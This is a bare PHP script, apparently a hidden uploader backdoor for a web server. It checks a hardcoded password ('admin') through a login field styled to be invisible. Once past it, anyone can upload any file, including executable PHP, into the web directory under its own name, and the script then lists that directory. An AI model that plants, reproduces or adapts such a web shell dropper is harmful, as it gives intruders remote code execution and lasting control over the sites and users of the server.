<?php 
$pass = "admin";
session_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
<?php
if (!empty($_GET['action']) &&  $_GET['action'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass)
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else
    {
        echo '<style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style><form action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="pass" type="password"></form>';
        exit;
    }
}
?>


<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
Please choose a file: <input name="file" type="file" /><br />
<input type="submit" value="Upload" /></form>


<?php

if (!empty($_FILES["file"]))
{
    if ($_FILES["file"]["error"] > 0)
       {echo "Error: " . $_FILES["file"]["error"] . "<br>";}
    else
       {echo "Stored file:".$_FILES["file"]["name"]."<br/>Size:".($_FILES["file"]["size"]/1024)." kB<br/>";
       move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
       }
}
    $myDirectory = opendir(".");
    while($entryName = readdir($myDirectory)) {$dirArray[] = $entryName;} closedir($myDirectory);
    $indexCount = count($dirArray);
        echo "$indexCount files<br/>";
    sort($dirArray);

    echo "<TABLE border=1 cellpadding=5 cellspacing=0 class=whitelinks><TR><TH>Filename</TH><th>Filetype</th><th>Filesize</th></TR>\n";

        for($index=0; $index < $indexCount; $index++)
        {
            if (substr("$dirArray[$index]", 0, 1) != ".")
            {
            echo "<TR>
            <td><a href=\"$dirArray[$index]\">$dirArray[$index]</a></td>
            <td>".filetype($dirArray[$index])."</td>
            <td>".filesize($dirArray[$index])."</td>
                </TR>";
            }
        }
    echo "</TABLE>";
    ?>